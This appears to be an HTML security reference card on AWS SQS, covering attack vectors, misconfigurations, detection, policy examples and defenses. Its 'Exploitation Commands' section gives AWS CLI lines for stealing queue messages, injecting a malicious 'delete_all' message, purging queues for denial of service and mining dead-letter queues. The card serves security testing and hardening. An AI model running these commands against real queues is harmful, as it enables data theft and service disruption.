@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS SQS Security | AWS Security Cards</title>
+<meta name="description" content="Simple Queue Service (SQS) provides managed message queuing for decoupling applications. Queue policies control access. Messages often contain sensitive data and trigger downstream processing.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/sqs-card.webp" alt="AWS SQS Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/sqs.svg" alt="AWS SQS Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS SQS Security</span>
+        <span class="header-badge">QUEUING</span>
+      </div>
+      <p class="header-desc">Simple Queue Service (SQS) provides managed message queuing for decoupling applications. Queue policies control access. Messages often contain sensitive data and trigger downstream processing.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">MEDIUM</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">14 Days</div>
+          <div class="stat-label">Max Retention</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">FIFO</div>
+          <div class="stat-label">Or Standard</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Pull</div>
+          <div class="stat-label">Model</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Standard Queues</h4>
+          <p>Best-effort ordering, at-least-once delivery. Unlimited throughput. Messages may be delivered more than once or out of order. Suitable for high-volume decoupling.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Messages can be read multiple times until deleted - persistence for attackers</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">FIFO Queues</h4>
+          <p>Exactly-once processing, strict ordering. 3,000 messages/sec with batching. Message deduplication prevents replays. Better for ordered transaction processing.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Deduplication can be bypassed with unique deduplication IDs</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 65%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">6.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">SQS queue misconfigurations allow message theft, injection, and processing pipeline manipulation. Dead-letter queues often contain failed sensitive messages that attackers can access.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Message Operations</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Receive messages from exposed queues</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Steal messages before legitimate consumers</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Delete messages to disrupt processing</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Send malicious messages to inject payloads</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Purge queues to cause denial of service</li></ul><h4 style="color: #f87171;">Queue Manipulation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify queue attributes</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Change dead-letter queue settings</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access dead-letter queues for failed data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extend visibility timeout to hold messages</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Tag resources for tracking</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Queue Policy Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Principal: * with no conditions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Allow SendMessage from any account</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Allow ReceiveMessage to everyone</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing source ARN/account conditions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Cross-account access too permissive</li></ul><h4 style="color: #fb923c;">Security Settings</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Messages not encrypted (SSE disabled)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Long message retention with sensitive data</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Dead-letter queue accessible to attackers</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No CloudTrail data events logging</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing VPC endpoint for private access</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Queues</div>
+          <pre><code>aws sqs list-queues</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Queue Attributes</div>
+          <pre><code>aws sqs get-queue-attributes \\
+  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/my-queue \\
+  --attribute-names All</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Queue Policy</div>
+          <pre><code>aws sqs get-queue-attributes \\
+  --queue-url URL \\
+  --attribute-names Policy</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Dead-Letter Queues</div>
+          <pre><code>aws sqs list-dead-letter-source-queues --queue-url URL</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Check Approximate Message Count</div>
+          <pre><code>aws sqs get-queue-attributes \\
+  --queue-url URL \\
+  --attribute-names ApproximateNumberOfMessages</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📥 Message Theft</h3><h4 style="color: #c084fc;">Reading Messages</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> ReceiveMessage to read queue contents</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Long polling (20 sec) for efficient theft</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Batch receive (up to 10 messages)</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access visibility timeout to keep messages</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Race legitimate consumers for data</li></ul><h4 style="color: #c084fc;">Dead-Letter Queue Mining</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> DLQ contains failed/problematic messages</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Often has sensitive data or credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Less monitored than main queues</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Messages retained up to 14 days</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Check RedrivePolicy for DLQ ARN</li></ul><div class="note"><strong>Gold Mine:</strong> Dead-letter queues often contain exception data with stack traces, credentials, and sensitive payloads.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">💉 Message Injection</h3><h4 style="color: #facc15;">Injection Scenarios</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Send malicious JSON to Lambda consumers</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Inject commands for EC2 workers</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Manipulate order processing data</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Trigger downstream application logic</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Batch send for amplified impact</li></ul><h4 style="color: #facc15;">Impact</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Code execution in message processors</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Data corruption in applications</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Financial transaction manipulation</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Denial of service via queue flooding</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Business logic bypass</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SendMessage - message sent to queue</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ReceiveMessage - message received</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteMessage - message deleted</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PurgeQueue - queue emptied</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SetQueueAttributes - policy changed</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Messages received by unknown principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk delete operations</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Queue policy modifications</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual SendMessage sources</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> High volume from new IP addresses</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Receive Messages (Steal Data)</div>
+          <pre><code>aws sqs receive-message \\
+  --queue-url https://sqs.us-east-1.amazonaws.com/VICTIM/queue \\
+  --max-number-of-messages 10 \\
+  --wait-time-seconds 20</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Send Malicious Message</div>
+          <pre><code>aws sqs send-message \\
+  --queue-url https://sqs.us-east-1.amazonaws.com/TARGET/process-queue \\
+  --message-body '{&quot;action&quot;:&quot;admin&quot;,&quot;command&quot;:&quot;delete_all&quot;}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Batch Send (Amplify Attack)</div>
+          <pre><code>aws sqs send-message-batch \\
+  --queue-url URL \\
+  --entries '[{&quot;Id&quot;:&quot;1&quot;,&quot;MessageBody&quot;:&quot;payload1&quot;},{&quot;Id&quot;:&quot;2&quot;,&quot;MessageBody&quot;:&quot;payload2&quot;}]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Purge Queue (DoS)</div>
+          <pre><code>aws sqs purge-queue --queue-url https://sqs.us-east-1.amazonaws.com/TARGET/queue</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Read Dead-Letter Queue</div>
+          <pre><code># First find DLQ from RedrivePolicy
+aws sqs receive-message \\
+  --queue-url https://sqs.us-east-1.amazonaws.com/TARGET/queue-dlq \\
+  --max-number-of-messages 10</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Extend Visibility (Hold Messages)</div>
+          <pre><code>aws sqs change-message-visibility \\
+  --queue-url URL \\
+  --receipt-handle HANDLE \\
+  --visibility-timeout 43200</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Public Queue</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Principal&quot;: &quot;*&quot;,
+    &quot;Action&quot;: [&quot;SQS:SendMessage&quot;, &quot;SQS:ReceiveMessage&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:sqs:us-east-1:123456789012:my-queue&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Anyone can send and receive messages - full queue compromise</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Account Restricted</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Principal&quot;: {&quot;AWS&quot;: &quot;arn:aws:iam::123456789012:root&quot;},
+    &quot;Action&quot;: [&quot;SQS:*&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:sqs:us-east-1:123456789012:my-queue&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Only same account can access the queue</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Risky - SNS Can Send</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Principal&quot;: {&quot;Service&quot;: &quot;sns.amazonaws.com&quot;},
+    &quot;Action&quot;: &quot;SQS:SendMessage&quot;,
+    &quot;Resource&quot;: &quot;arn:aws:sqs:us-east-1:123456789012:queue&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Any SNS topic can send - should have source ARN condition</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Source ARN Restricted</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Principal&quot;: {&quot;Service&quot;: &quot;sns.amazonaws.com&quot;},
+    &quot;Action&quot;: &quot;SQS:SendMessage&quot;,
+    &quot;Resource&quot;: &quot;arn:aws:sqs:us-east-1:123456789012:queue&quot;,
+    &quot;Condition&quot;: {
+      &quot;ArnEquals&quot;: {
+        &quot;aws:SourceArn&quot;: &quot;arn:aws:sns:us-east-1:123456789012:my-topic&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Only specific SNS topic can send messages</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Enable Server-Side Encryption</h4>
+              <p>Encrypt messages at rest with SQS-managed or KMS keys.</p>
+              <pre><code>aws sqs set-queue-attributes \\
+  --queue-url URL \\
+  --attributes KmsMasterKeyId=alias/sqs-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Restrict Queue Policies</h4>
+              <p>Never use Principal: * without conditions. Use source ARN/account conditions.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Secure Dead-Letter Queues</h4>
+              <p>Apply same or stricter policies to DLQs as main queues.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Enable CloudTrail Data Events</h4>
+              <p>Log SendMessage and ReceiveMessage operations for auditing.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>Use VPC Endpoints</h4>
+              <p>Access SQS through VPC endpoint to avoid public internet.</p>
+              <pre><code>aws ec2 create-vpc-endpoint \\
+  --vpc-id vpc-xxx \\
+  --service-name com.amazonaws.us-east-1.sqs</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">⏱️</span>
+            <div>
+              <h4>Set Appropriate Retention</h4>
+              <p>Minimize message retention period to reduce exposure window.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS SQS Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
